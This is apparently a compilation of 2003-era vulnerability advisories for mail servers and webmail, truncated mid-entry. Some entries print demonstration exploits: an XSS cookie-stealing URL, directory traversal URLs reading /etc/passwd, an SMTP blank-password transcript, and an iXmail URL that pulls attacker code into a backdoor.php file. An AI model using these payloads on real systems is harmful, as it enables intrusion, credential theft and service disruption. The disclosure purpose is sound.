Title: oMail-webmail Input Validation Flaw in checklogin() Lets Remote Users Execute Arbitrary Shell Commands
Impact: Execution of arbitrary code via network
Description:
A vulnerability was reported in oMail-webmail.  In the default configuration, a remote user can gain root access on the target server.
It is reported that the checklogin() function does not filter user-supplied input in the $domainname, $username, and $password variables. A remote user can submit specially crafted values that contain shell metacharacters to execute arbitrary commands on the system.

The vendor has reportedly been notified.
Impact': A remote user can execute arbitrary shell commands.  In the default configuration, these commands are executed with root privileges.

Title: vHost POP Server Can Be Crashed By Remote Users
Description:
A denial of service vulnerability was reported in vHost in the POP3 daemon.  A remote user can crash the POP3 service.
It is reported that a remote user can send a long request to the vpop3d POP3 server to cause the daemon to crash after a timeout period.

The following error message is provided before the daemon crashes:

"-ERR POP3 Server Abnormal Shutdown: Timeout waiting for command from client"

A manual restart of the daemon is required to return to normal operations.

A demonstration exploit is provided in the Source Message.

The vendor has reportedly been notified.
Impact': A remote user can crash the POP3 service.
Solution: No solution was available at the time of this entry.

Title: (Vendor Issues Fix) Re: DeskNow Web Mail Uses Clear Text Authentication for Web Mail Access
Description:
Dennis Rand at Infowarfare.dk reported a vulnerability in Ventia's DeskNow communications server.  The system uses clear text authentication.
It is reported that the Web Mail login requires the username and password to be sent via the network without encryption.  A remote user with access to the target user's or target server's traffic stream can view passwords.
Impact': The system discloses passwords to users that are sniffing the network.
Solution: The vendor has released a fixed version of DeskNow (2.0).  The vendor recommends that customers upgrade (a free upgrade is available).

Title: CheckMail Discloses Passwords to Local Users
Description:
CyberTalon reported a password disclosure vulnerability in CheckMail.  A local user can view e-mail account passwords.
It is reported that the software stores usernames and passwords for associated e-mail accounts in the following Windows registry key:

HKEY_USERS\S-1-5-21-823518204-436374069-1708537768-1004\Software\DeskSoft\CheckMail

A local user can read the registry to view the passwords.
Impact': A local user can obtain e-mail account passwords.
Solution: No solution was available at the time of this entry.

Title: StarFish Family Mail Discloses Passwords to Local Users
Description:
CyberTalon reported a password disclosure vulnerability in StarFish Family Mail.  A local user can view passwords.
It is reported that the software stores usernames and passwords in clear text in the 'accounts/accounts.db' file.  A local user can read the file to obtain the passwords.
Impact': A local user can view passwords.
Solution: No solution was available at the time of this entry.

Title: NetMail Discloses Passwords to Local Users
Description:
CyberTalon reported a password disclosure vulnerability in NetMail.  A local user can obtain passwords.
It is reported that NetMail stores user passwords using an encoding algorithm that can be readily decoded.  A local user can obtain the encoded password and then decode the password.

A demonstration exploit is available at:

http://www.geocities.com/the_cyber_talon/Exploits/netmail_705_exploit.zip

The demonstration exploit appears to use a simple character offset method.
Impact': A local user can obtain passwords.
Solution: No solution was available at the time of this entry.

Title: Allenchow POP3 Checker Discloses Passwords to Local Users
Description:
CyberTalon reported a password disclosure vulnerability in Allenchow POP3 Checker (ACMPOP).  A local user can obtain passwords.
It is reported that the software stores passwords on the local system using an encoding algorithm that can be readily decoded.  A demonstration exploit is available at:

http://www.geocities.com/the_cyber_talon/Exploits/allenchow_pop3checker_15_exploit.zip

The demonstration exploit algorithm appears to use a simple character offset method.
Impact': A local user can view passwords for the POP3 accounts.
Solution: No solution was available at the time of this entry.

Title: Cronus CPOP Discloses Passwords to Local Users
Description:
CyberTalon reported a password disclosure vulnerability in CPOP.  A local user can view e-mail passwords.
It is reported that the software stores e-mail account names and passwords in clear text in the 'MailBoxs.xml' and 'Servers.xml' files.  A local user can view the information.
Impact': A local user can view passwords.
Solution: No solution was available at the time of this entry.

Title: Magic Winmail Server Discloses Passwords to Local Users
Description:
CyberTalon reported a password disclosure vulnerability in the Magic Winmail Server.  A local user can obtain server passwords.
It is reported that the software stores passwords in clear text in the 'userauth.cfg' file.  A local user can view the passwords.
Impact': A local user can view passwords.
Solution: No solution was available at the time of this entry.

Title: Ecartis Buffer Overflows May Let Remote Users Execute Arbitrary Code
Impact: Execution of arbitrary code via network
Description:
Several buffer overflow vulnerabilities were reported in Ecartis.  A remote user may be able to execute arbitrary code on the system.
It was reported that the smtp.c, unhttp.c, and unmime.c files contain buffer overflows.  The report indicated that there may be other files that contain overflows.  A remote user may be able to cause the system to execute arbitrary code [CVE: CVE-2003-0782].

It is also reported that the software does not properly validate user-supplied input in certain locations.  A remote user can exploit this to view the contents of certain variables, such as passwords [CVE: CVE-2003-0781].  As a demonstration exploit, a remote user can send the following e-mail to the ecartis address:

subscribe secret-list
subscribe <$post-password>

According to the report, the first command will fail but still cause the system to select the 'secret-list' as the active list.  Then, the second command will also fail, but the reply e-mail returned by the system to the remote user will expand the $post-password variable to the actual password.
Impact':
A remote user may be able to execute arbitrary code on the target system.

A remote user can determine the content of certain variables, such as passwords.
Solution:
No solution was available at the time of this entry.

The author of the report has provided an unofficial patch for some of the buffer overflows [available in the Source Message].

Title: Inframail Discloses Passwords to Local Users
Description:

It is reported that the server stores user account information, including passwords in clear text, in the '/data/accounts.txt' file.  A local user can view the passwords.
Impact': A local user can view passwords for e-mail users.
Solution: No solution was available at the time of this entry.

Description:

Solution: No solution was available at the time of this entry.

Title: Eudora WorldMail Server Input Filtering Hole in Search Feature Permits Remote Cross-Site Scripting Attacks
Impact: Execution of arbitrary code via network
Description:
An input validation vulnerability was reported in the Eudora WorldMail Server.  A remote user can conduct cross-site scripting attacks against e-mail users.
exploitlabs.com reported that a search feature does not filter HTML code from user-supplied input when displaying the input.  A remote user can create a specially crafted URL that, when loaded by a target user, will cause arbitrary scripting code to be executed by the target user's browser. The code will originate from the site running the Eudora WorldMail Server software and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.

A demonstration exploit URL is provided:

http://[host]:8888/c%3dAE?%3FO=%3CSCRIPT%3Ealert%28document.cookie%29%3B%3C%2FSCRIPT%3E
Impact': A remote user can access the target user's cookies (including authentication cookies), if any, associated with the site running the Eudora WorldMail Server software, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.
Solution: No solution was available at the time of this entry.

Title: imate Web Mail Server Discloses E-mail Passwords to Local Users
Description:
CyberTalon reported a password disclosure vulnerability in the imate Web Mail Server.  A local user can view user passwords.
It is reported that the server stores each user's password in the 'user.dat' file.  The exact path where each 'user.dat' file is located depends on the type of user account.  A local user can view passwords.
Impact': A local user can view passwords for the web mail users.
Solution: No solution was available at the time of this entry.

Title: Mercury/32 Mail Server Discloses Passwords to Local Users
Description:
CyberTalon reported a vulnerability in the Mercury Mail Transport Agent.  A local user can view passwords for the mail server users'
It is reported that the server stores a user's e-mail password in clear text in the 'C:/Mercury/MAIL/[username]/PASSWD.PM' file.  A local user can view the password.
Impact': A local user can view passwords for e-mail server users.
Solution: No solution was available at the time of this entry.

Title: MDaemon SMTP Authentication Flaw Lets Remote Users Access the SMTP Service
Description:
A vulnerability was reported in the SMTP authentication feature of the MDaemon mail server.  A remote user can gain SMTP access without supplying valid authentication credentials.
It is reported that a remote user can supply a valid user name with a blank password to gain access to the SMTP service.  This can be abused to send unauthorized SPAM via the mail server if the mail server is configured for mail relaying.

A demonstration exploit transcript is provided:

220 xxx.com ESMTP MDaemon 5.0.5; Sat, 02 Aug 2003 00:51:06 +0200
EHLO localhost
250-xxx.com Hello localhost, pleased to meet you
250-ETRN
250-AUTH LOGIN CRAM-MD5
250-8BITMIME
250 SIZE 0
AUTH LOGIN
334 VXNlcm5hbWU6               (334 Username:)
TURhZW1vbg==                      (MDaemon)
334 UGFzc3dvcmQ6               (334 Password:)
                                             (blank password)
235 Authentication successful

The vendor has reportedly been notified.
Impact': A remote user can access the SMTP service without supplying a password.
Solution: No solution was available at the time of this entry.

Title: (Conectiva Issues Fix) Postfix Bounce Messages Let Remote Users Scan for Open Ports on Other Hosts
Description:
A vulnerability was reported in Postfix.  A remote user can use a Postfix server to scan for open/closed ports on other hosts.
It is reported that a remote user can use a target Postfix server to conduct bounce scans of other hosts or denial of service attacks against other hosts.

A remote user can send a probing message to the following address (RCPT TO):

<[server_ip]:service!@local-host-name>

The target Postfix server will then attempt to connect to the specified port on the specified victim server.  If the specified port is open, the target Postfix server will wait until the SMTP greeting timeout occurs before queueing the message.  If the specified port if closed, the target Postfix server will immediately queue the message.  By examining error messages eventually returned to the sender by the target Postfix server, the remote user (i.e., the sender) can determine which ports are open/closed on the specified victim server, according to the report.

The remote user can engage many Postfix servers to direct a large number of connections to a victim server to attempt a distributed denial of service attack.

Postfix versions 1.1.12 and 2.0 are reportedly not affected.
Impact':
A remote user can scan various hosts looking for open/closed ports using the Postfrix server as the scanning agent.

A remote user can attempt to conduct distributed denial of service attacks against various hosts using the Postfix server as the attack generator.
Solution:
Conectiva has released a fix.

Title: (Conectiva Issues Fix) Postfix Address Resolver Parsing Bug Lets Remote Users Hang the System
Description:
A denial of service vulnerability was reported in Postfix.  A remote user may be able to cause the queue manager to lock up.
It is reported that the address parser code contains a flaw.  A remote user can create a specially crafted envelope address in the SMTP header to cause the 'nqmgr' process to lock up.  The exploit message's destination address must reportedly be crafted to cause a bounce (e.g., "<nonexistent@local-server-name>", "<nonexistent@[127.0.0.1]>") and the "mail from" or "Errors-To" addresses must reportedly be of the form "<.!>" or "<.!@local-server-name>".  According to the report, when the code attempts to parse and rewrite the from/error address, the queue manager will lock up.

The offending message must be removed before the queue manager is restarted in order to return to normal operations.

It is also reported that a remote user can cause an instance of the SMTP listener to lock up by sending a specially crafted "RCPT TO" address of the form "<.!>" or "<.!@local-server-name>".  By repeating this method, the remote user can cause denial of service conditions.

The report indicates that the system will write the following messasge to the mail log file when the flaw is triggered:

"resolve_clnt_query: null recipient"

Versions prior to 1.1.9 are not vulnerable in the default configuration, unless the 'append_dot_mydomain' setting is disabled via the configuration file.

Version 2.0 is not affected, according to the report.

The vendor was reportedly notified on July 27, 2003.
Impact':
A remote user can cause the queue manager to lock up until the exploit message is removed from the queue.

A remote user can cause a single instance of the SMTP listener to lock up until the exploit message is removed from the queue.
Solution:
Conectiva has released a fix.

Title: (Mandrake Issues Fix) Re: Postfix Bounce Messages Let Remote Users Scan for Open Ports on Other Hosts
Description:
A vulnerability was reported in Postfix.  A remote user can use a Postfix server to scan for open/closed ports on other hosts.
It is reported that a remote user can use a target Postfix server to conduct bounce scans of other hosts or denial of service attacks against other hosts.

A remote user can send a probing message to the following address (RCPT TO):

<[server_ip]:service!@local-host-name>

The target Postfix server will then attempt to connect to the specified port on the specified victim server.  If the specified port is open, the target Postfix server will wait until the SMTP greeting timeout occurs before queueing the message.  If the specified port if closed, the target Postfix server will immediately queue the message.  By examining error messages eventually returned to the sender by the target Postfix server, the remote user (i.e., the sender) can determine which ports are open/closed on the specified victim server, according to the report.

The remote user can engage many Postfix servers to direct a large number of connections to a victim server to attempt a distributed denial of service attack.

Postfix versions 1.1.12 and 2.0 are reportedly not affected.
Impact':
A remote user can scan various hosts looking for open/closed ports using the Postfrix server as the scanning agent.

A remote user can attempt to conduct distributed denial of service attacks against various hosts using the Postfix server as the attack generator.
Solution:
Mandrake has issued a fix.

Title: (Mandrake Issues Fix) Re: Postfix Address Resolver Parsing Bug Lets Remote Users Hang the System
Description:
A denial of service vulnerability was reported in Postfix.  A remote user may be able to cause the queue manager to lock up.
It is reported that the address parser code contains a flaw.  A remote user can create a specially crafted envelope address in the SMTP header to cause the 'nqmgr' process to lock up.  The exploit message's destination address must reportedly be crafted to cause a bounce (e.g., "<nonexistent@local-server-name>", "<nonexistent@[127.0.0.1]>") and the "mail from" or "Errors-To" addresses must reportedly be of the form "<.!>" or "<.!@local-server-name>".  According to the report, when the code attempts to parse and rewrite the from/error address, the queue manager will lock up.

The offending message must be removed before the queue manager is restarted in order to return to normal operations.

It is also reported that a remote user can cause an instance of the SMTP listener to lock up by sending a specially crafted "RCPT TO" address of the form "<.!>" or "<.!@local-server-name>".  By repeating this method, the remote user can cause denial of service conditions.

The report indicates that the system will write the following messasge to the mail log file when the flaw is triggered:

"resolve_clnt_query: null recipient"

Versions prior to 1.1.9 are not vulnerable in the default configuration, unless the 'append_dot_mydomain' setting is disabled via the configuration file.

Version 2.0 is not affected, according to the report.

The vendor was reportedly notified on July 27, 2003.
Impact':
A remote user can cause the queue manager to lock up until the exploit message is removed from the queue.

A remote user can cause a single instance of the SMTP listener to lock up until the exploit message is removed from the queue.
Solution:
Mandrake has issued a fix.

Title: Postfix Bounce Messages Let Remote Users Scan for Open Ports on Other Hosts
Description:
A vulnerability was reported in Postfix.  A remote user can use a Postfix server to scan for open/closed ports on other hosts.
It is reported that a remote user can use a target Postfix server to conduct bounce scans of other hosts or denial of service attacks against other hosts.

A remote user can send a probing message to the following address (RCPT TO):

<[server_ip]:service!@local-host-name>

The target Postfix server will then attempt to connect to the specified port on the specified victim server.  If the specified port is open, the target Postfix server will wait until the SMTP greeting timeout occurs before queueing the message.  If the specified port if closed, the target Postfix server will immediately queue the message.  By examining error messages eventually returned to the sender by the target Postfix server, the remote user (i.e., the sender) can determine which ports are open/closed on the specified victim server, according to the report.

The remote user can engage many Postfix servers to direct a large number of connections to a victim server to attempt a distributed denial of service attack.

Postfix versions 1.1.12 and 2.0 are reportedly not affected.
Impact':
A remote user can scan various hosts looking for open/closed ports using the Postfrix server as the scanning agent.

A remote user can attempt to conduct distributed denial of service attacks against various hosts using the Postfix server as the attack generator.
Solution:
This vulnerability has reportedly been fixed in version 1.1.12 and later versions, available at:

http://www.postfix.org/

Title: Postfix Address Resolver Parsing Bug Lets Remote Users Hang the System
Description:
A denial of service vulnerability was reported in Postfix.  A remote user may be able to cause the queue manager to lock up.
It is reported that the address parser code contains a flaw.  A remote user can create a specially crafted envelope address in the SMTP header to cause the 'nqmgr' process to lock up.  The exploit message's destination address must reportedly be crafted to cause a bounce (e.g., "<nonexistent@local-server-name>", "<nonexistent@[127.0.0.1]>") and the "mail from" or "Errors-To" addresses must reportedly be of the form "<.!>" or "<.!@local-server-name>".  According to the report, when the code attempts to parse and rewrite the from/error address, the queue manager will lock up.

The offending message must be removed before the queue manager is restarted in order to return to normal operations.

It is also reported that a remote user can cause an instance of the SMTP listener to lock up by sending a specially crafted "RCPT TO" address of the form "<.!>" or "<.!@local-server-name>".  By repeating this method, the remote user can cause denial of service conditions.

The report indicates that the system will write the following messasge to the mail log file when the flaw is triggered:

"resolve_clnt_query: null recipient"

Versions prior to 1.1.9 are not vulnerable in the default configuration, unless the 'append_dot_mydomain' setting is disabled via the configuration file.

Version 2.0 is not affected, according to the report.

The vendor was reportedly notified on July 27, 2003.
Impact':
A remote user can cause the queue manager to lock up until the exploit message is removed from the queue.

A remote user can cause a single instance of the SMTP listener to lock up until the exploit message is removed from the queue.
Solution:
The vendor has released a fixed version (1.1.13), to be available at:

http://www.postfix.org/

Some workarounds for certain versions are described in the Source Message.

Also, version 2.0 is not vulnerable.

Title: Novell GroupWise WebAccess Discloses Wireless User Passwords to Local Users
Description:
A vulnerability was reported in Novell GroupWise WebAccess.  The system discloses passwords of wireless GroupWise users to local users on the WebAccess server.
Novacoast reported that the server logs the usernames and passwords of wireless users in clear text in the web server log file. According to the report, the passwords are listed as part of the access URL (stored in the form "username=****&password=****").  A local user can view the web server log file to obtain user passwords.

According to the vendor, the flaw occurs when a target user accesses WebAccess via a wireless phone.  The flaw occurs when used with WML and HDML, and does not occur when "FRAMES" or "SIMPLE" templates are used, Novell reported.
Impact': A local user can view user passwords.
Solution:
The vendor has released a fixed version (6.5 SP1), available at:

http://support.novell.com

Title: QmailAdmin Forwarding Rule Lets Remote Users Execute Arbitrary Commands on the System
Impact: Execution of arbitrary code via network
Description:
A vulnerability was reported in QmailAdmin.  A remote user can execute arbitrary commands on the mail server.
Secunia reported that a remote user can create a "forward rule" to forward e-mail messages to a local system command.  The commands are reportedly executed with the privileges of the 'vpopmail' user account.  No further details were provided.
Impact': A remote user can execute arbitrary operating system commands with 'vpopmail' user privileges.
Solution:
The vendor has released fixed versions (development version 1.0.25, stable version 1.0.6), available at:

http://www.inter7.com/qmailadmin/qmailadmin-1.0.6.tar.gz
http://sourceforge.net/project/showfiles.php?group_id=6691&release_id=173699

Title: Microsoft Outlook Web Access Can Be Crashed By Remote Authenticated Users With an Outlook 2003 Client
Description:
A denial of service vulnerability was reported in Microsoft Outlook Web Access (OWA).  A remote authenticated user with an Outlook 2003 client may be able to cause the OWA web service to crash.
It is reported that a remote authenticated user can access their mailbox via the Outlook 2003 client and then access their mail via OWA to cause the Internet Information Server (IIS) web services on the OWA host to crash.

The author of the report indicates that this information was provided by Microsoft.

No further details were provided.
Impact': A remote authenticated user can cause the OWA web services to crash.
Solution:
No solution was available at the time of this entry.

The author reports that the only known workaround is to avoid using Outlook 2003.

Title: Microsoft SMTP Service Can Be Crashed By Remote Users Sending Mail With an Invalid FILETIME Header
Description:
A vulnerability was reported in the Microsoft Windows 2000 SMTP Service.  A remote user can cause the SMTP service to crash.
It is reported that a remote user can send an e-mail message containing an invalid FILETIME attribute to or through the target server to cause the SMTP service to crash.

Microsoft Exchange Server 2000 is also affected by this vulnerability.
Impact': A remote user can cause the target SMTP service to stop processing traffic or shutdown.
Solution:
The vendor has issued a fix in Windows 2000 SP4.  For information on obtaining SP4, see the following Microsoft Knowledge Base article:

http://support.microsoft.com/default.aspx?scid=kb;EN-US;260910

Title: Microsoft Exchange Server Can Be Crashed By Remote Users Sending Mail With an Invalid FILETIME Header
Description:
A vulnerability was reported in the Microsoft Exchange 2000 Server.  A remote user can cause the SMTP service to crash.
It is reported that a remote user can send an e-mail message containing an invalid FILETIME attribute to or through the target server to cause the SMTP service to crash.

Microsoft Windows 2000 SMTP Service is also affected by this vulnerability.
Impact': A remote user can cause the target SMTP service to stop processing traffic or shutdown.
Solution:
The vendor has issued a fix in Windows 2000 SP4.  For information on obtaining SP4, see the following Microsoft Knowledge Base article:

http://support.microsoft.com/default.aspx?scid=kb;EN-US;260910

Title: MDaemon Buffer Overflow in EXAMINE and SELECT IMAP Commands Allows Remote Authenticated Users to Execute Code
Impact: Execution of arbitrary code via network
Description:
Dennis Rand of Infowarfare.dk reported two vulnerabilities in the MDaemon IMAP service.  A remote authenticated user can execute arbitrary code with System level privileges.
It is reported that a remote authenticated user can send a specially crafted EXAMINE or SELECT IMAP command to the server to cause the system to crash or to execute arbitrary code with System privileges.  To return the system to normal operations, the IMAP service must be restarted, according to the report.

A demonstration exploit command is provided:

0002 SELECT "aaa...[2500 Bytes]...aaaa"

0002 EXAMINE "aaa...[2500 Bytes]...aaaa"

The following notification timeline is provided:

01/07/2003 Found the Vulnerability, and made an analysis.
01/07/2003 Reported to Vendor
04/07/2003 Recived response from vendor
13/07/2003 Public Disclosure.
Impact': A remote authenticated user can cause the IMAP service to crash or to execute arbitrary code with System privileges.
Solution: The vendor has reportedly issued a fixed version (6.8.0).

Title: Gattaca Server Discloses Files to Remote Users and Can Be Crashed By Remote Authenticated Users
Impact: Denial of service via local system
Description:
Gregory Le Bras of Security Corporation reported several vulnerabilities in the Gattaca Server.  A remote user can view files on the system.  A remote authenticated user can cause the system to crash.  A remote user can also conduct cross-site scripting attacks against server users.
It is reported that a remote user can supply an HTTP GET request with two slashes ("//") to cause the server to list all files in the directory.  

A remote user can also supply a URL for the 'view.tmpl' script containing "../" directory traversal characters to view arbitrary specified files on the system.  A demonstration exploit URL is provided:

http://[target]/view.tmpl?testfile=../../winnt/win.ini

A remote authenticated user or a local user can execute a specially crafted LLIST command with a buffer of 1048 bytes or more to cause the target server to crash.  A demonstration exploit using the Gattaca console is provided:

$> LLIST AAAA...[1024]...AAAA

An input validation vulnerability was reported in 'view2.tmpl'.  A remote user can create a specially crafted URL that, when loaded by a target user, will cause arbitrary scripting code to be executed by the target user's browser. The code will originate from the site running the Gattaca software and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.

A demonstration exploit URL is provided:

http://[target]/view2.tmpl?text=[hostile_code]

The following notification timeline is provided:

08/07/2003 Vulnerability discovered
08/07/2003 Vendor notified
09/07/2003 Vendor response
09/07/2003 Security Corporation clients notified
09/07/2003 Started e-mail discussions
10/07/2003 Last e-mail received
10/07/2003 Public disclosure
Impact':
A remote user can view a listing of directory contents on the server.  A remote user can also view arbitrary files on the system.

A remote authenticated user can cause the server to crash.

A remote user can access the target user's cookies (including authentication cookies), if any, associated with the site running the Gattaca Server software, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.
Solution:
No solution was available at the time of this entry.  The vendor reportedly plans to issue a fix in the next version.

The vendor has reportedly provided some workaround suggestions, available in the Source Message.

Title: Microsoft Outlook Web Access (OWA) May Disclose The User's OWA Password to Remote Users
Impact: Execution of arbitrary code via network
Description:
Some vulnerabilities were reported in Microsoft Outlook Web Access (OWA).  A remote user can bypass security filtering to execute arbitrary scripting code that can obtain a target OWA user's password.
Infohacking Team reported that a remote user can send specially crafted HTML-based e-mail to a target user to obtain the target user's domain username and password.

According to the report, a remote user can create HTML with a link that, when loaded by the target user, will access the very same HTML content but without applying the OWA HTML security filtering.  This is achieved by creating a link that does not include the 'Security=1' parameter.  To successfully exploit this, the remote user must know the IP address or the domain name of the target user's Microsoft Exchange server, but this can be readily obtained by various methods, the report indicated.

When the malicious HTML is opened by the target user via the described method, arbitrary scripting code can be executed to obtain the target user's domain name, username, and password.  According to the report, OWA uses HTTP "Basic Auth", storing the user's username and password in Base64-encoded format.  So, the scripting code can perform an HTTP TRACE request and supply the response (including the Base64-encoded password) to the remote user.

The vendor has reportedly been notified.

A demonstration exploit is available at:

http://www.infohacking.com/INFOHACKING_RESEARCH/Our_Advisories/OWA/OWA_XSS.htm
Impact': A remote user may be able to obtain the target user's OWA username and password.
Solution: No solution was available at the time of this entry.

Title: Rockliffe MailSite Express Discloses Attachments to Remote Users
Description:
A vulnerability was reported in Rockliffe MailSite Express.  A remote user can view e-mail attachments.
Zone-h security reported that the system stores attachments in the 'cache' directory but does not authenticate requests for documents in that directory.  A remote user can monitor the network to view attachment URLs.  Also, on servers that maintain publicly accessible statistics for all web pages accessed on the server, a remote user can look through the statistics page to locate attachment URLs.

A demonstration exploit example URL is provided:

http://[target]/express/cache/DC44AEECB46AE0C029E85BBD43089833/411820066/attachment

The vendor has reportedly been notified.
Impact': A remote user can view attachments stored on the mail server.
Solution: No solution was available at the time of this entry.

Title: (Fix is Available) Rediffmail Password Changing Process Lets Remote Users Hijack Accounts
Description:
Viper reported an authentication vulnerability in the Rediffmail hosted e-mail service.  A remote user can hijack a target user's e-mail account.
It is reported that a remote user can exploit a flaw in the system's password changing process to set a target user's password to an arbitrary value.

The report indicates that the system's password validation process compares the user-supplied 'Old Password' against the contents of an encrypted value 'oldpassdb', both from the web form submitted by the user, instead of comparing the user-supplied 'Old Password' against a value stored by the Rediffmail system.

The report indicates that the 'oldpassdb' value is composed of the first two letters of the target user's Rediffmail user ID followed by an encrypted version of the Old Password.  Thus, a remote user can setup an account with a user ID that has the same first two letters as the target user's account (e.g., "sam" vs. "sal").  The remote user can then obtain the 'oldpassdb' value from their own new account.  This value can then reportedly be used to create HTML that, when loaded by the target user, will immediately change the password of the target user without any interaction on the part of the target user.

It is also reported that a remote user can exploit cross-frame vulnerabilities present in some web browsers to access the contents of a target user's 'Change Password' page.  This page reportedly contains personal and sensitive information related to the target user's account, including the answer to the 'Hint Questions', the date and place of birth, and other details.

A remote user can create HTML that, when loaded by a target user that is currently logged in to the system, can use an IFRAME to load the 'Change Password' page and access the information.  Then, the remote user can use this information to request the target user's password via the Forgotten Password feature.

A demonstration exploit script is provided in the Source Message.
Impact':
A remote user can create HTML that, when loaded by the target user, will cause the target user's password to be changed to an arbitrary value.

A remote user can also obtain values from the target user's 'Change Password' page.  Then, using these values, the remote user can request the target user's password.
Solution: The vendor was notified on July 4, 2003 at 0500 UTC/GMT and issued a fix at 14:30 IST.

Title: (New Versions Still Vulnerable; Exploit Released) Re: eXtremail Mail Server Yields Root Level Privileges for Remote Users
Impact: Execution of arbitrary code via network
Description:
A vulnerability has been discovered in the eXtremail mail server that allows remote users to obtain root level privileges on the server.
The format string problem is reportedly located in the flog() function, where user-supplied data is used as the format string for an fprintf() statement. 

A remote user can send appropriately constructed strings as the arguments to the following commands to obtain root-level privileges on the server:

Smtpd - HELO / EHLO / MAIL FROM:<....@....> / RCPT TO:<....@....>
Pop3 - USER (+ others requiring a suitable login).

Demonstration expoit code is contained in the Source Message.
Impact': A remote user can cause arbitrary commands to be executed by the mail server with root level privileges, giving root level access to the server.
Solution:
The vulnerability was reportedly fixed in version 1.1.10.  However, a user reports that the vulnerability has been reintroduced in more recent versions.  Versions 1.5-5 and 1.5-8 are reported to be vulnerable.  [Editor's note:  It is not clear which version reintroduced the flaw.]

Some demonstration exploit code is provided in the Source Message [it is base64 encoded].

Title: iXmail Bugs Let Remote Users Login, View and Delete Files, and Execute Arbitrary Commands on the System
Impact: Execution of arbitrary code via network
Description:
Several vulnerabilities were reported in the iXmail web mail system.  A remote user can upload files to the server and execute them. A remote user can also view or delete certain files on the server and inject SQL commands to gain authenticated access to the application.
Frog-m@n reported that a remote authenticated user can supply specially crafted '$attach1' and '$attach1_name' variables to the 'xmail_attach.php' script to upload arbitrary files to the system, including PHP files.  A demonstration exploit URL is provided:

http://[target]/ixmail_attach.php?submit=1&attach1=http://[attacker]/badcode.txt&attach1_name=backdoor.php

In the above example, the 'badcode.txt' file will be written to the 'tmp' directory in the web document directory as the 'backdoor.php' file.  The PHP code in 'backdoor.php' can then be executed (with the privileges of the web server) with the following type of URL:

http://[target]/tmp/backdoor.php

A remote authenticated user can also "upload" files that actually reside on the target server.  In this manner, a local user can copy files in the installation directory (such as 'include/ixmail_config.inc.php') to the 'tmp' directory in the web document directory.  This allows a local user to view ixmail configuration information, according to the report.

A vulnerability was reported in the 'ixmail_netattach.php' script.  The script allows a remote authenticated user to delete certain files, such as scripts on the server.

An authentication vulnerability was reported in 'index.php'.  If 'magic_quotes_gpc' is configured to be 'off' in the 'php.ini' configuration file, then a remote user can submit a specially crafted request to inject SQL commands to become authenticated on the application.
Impact':
A remote user can gain access to the application without authenticating.

A remote authenticated user can upload PHP code to the system and then execute the code with the privileges of the web server.

A remote authenticated user can delete files from the installation directory.

A remote authenticated user can view files in the installation directory.
Solution:
The vendor has released a fixed version (0.3 beta), available at:

http://www.a-suivre.net/ixmail/index2.php?page=download

Title: VisNetic MailServer Web Mail Interface Discloses PHP Source Code to Remote Users
Description:
An information disclosure vulnerability was reported in VisNetic MailServer in the web mail interface.  A remote user can view PHP source code.
Tripbit Security reported that a remote user can append a period character ('.') to a URL to view the PHP source code of the specified web page.

Some demonstration exploit URLs are provided:

http://host:32000/mail/admin/../include.html.
http://host:32000/mail/admin/../settings.html.

The vendor has reportedly been notified.
Impact': A remote user can view the source code of PHP scripts on the web mail interface.
Solution: No solution was available at the time of this entry.  The vendor is reportedly working on a fix.

Title: Horde IMP Server Discloses Files on the System to Remote Users
Description:
A vulnerability was reported in the Horde Internet Messaging Program (IMP).  A remote user can view files on the system.
SecuriTeam reported that Elia Florio has disclosed a vulnerability in the specification of cascading style sheets on the administrative web interface.  A remote user can supply a specially crafted path value to the 'index.php' script to read specified files with the privileges of the web server process.

http://[target]/horde/admin/css/index.php?file=../../../../../../../../../etc/passwd

It is also reported that a remote user can cause the system to display the installation path using this method but supplying a non-existant file to the 'index.php' script.

http://[target/horde/admin/css/index.php?file=xxyyzz

[Editor's note:  It is not clear from the SecuriTeam report whether the remote user must be an authenticated remote user or not.]
Impact':
A remote user can view files on the system with the privileges of the web server process.

A remote user can determine the installation path.
Solution: No solution was available at the time of this entry.

Title: Active MailServer Can Be Crashed By Remote Users
Description:
Ziv Kamir reported a denial of service vulnerability in the NGC Active MailServer.  A remote user can cause the mail server to crash.
It is reported that a remote user can supply a specially crafted "HELO" or "MAIL FROM" or "RCPT TO" command to trigger a buffer overflow and cause the mail service to crash.  According to the report, a buffer size of 33,000 bytes is required to trigger a crash.

The vendor has reportedly been notified (on June 19, 2003).
Impact': A remote user can cause the mail service to crash.
Solution: No solution was available at the time of this entry.

Title: Kerio MailServer Buffer Overflows in 'add_acl', 'do_map', 'do_subscribe', and 'list' Modules Let Remote Authenticated Users Execute Arbitrary Code
Impact: Execution of arbitrary code via network
Description:
Several buffer overflow vulnerabilities were reported in the Kerio MailServer.  A remote authenticated user can execute arbitrary code with system privileges.  Some cross-site scripting flaws exist, as well.
David F. Madrid reported that the Kerio MailServer's web mail interface contains several flaws.

A remote authenticated user can supply a specially crafted 'showuser' user name variable to the 'do_subscribe' module to trigger a buffer overflow and overwrite the EIP instruction pointer.  As a result, a remote user can cause arbitrary code to be executed.  A demonstration exploit URL is provided:

http://[server]/do_subscribe?showuser=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

A similar buffer overflow was reported in the 'add_acl', 'list', and 'do_map' modules.  Some demonstration exploit URLs are provided:

http://[server]/add_acl?folder=~AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@localhost/INBOX&add_name=lucas

http://[Server]/list?folder=~AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@localhost/INBOX

http://[Server]/do_map?
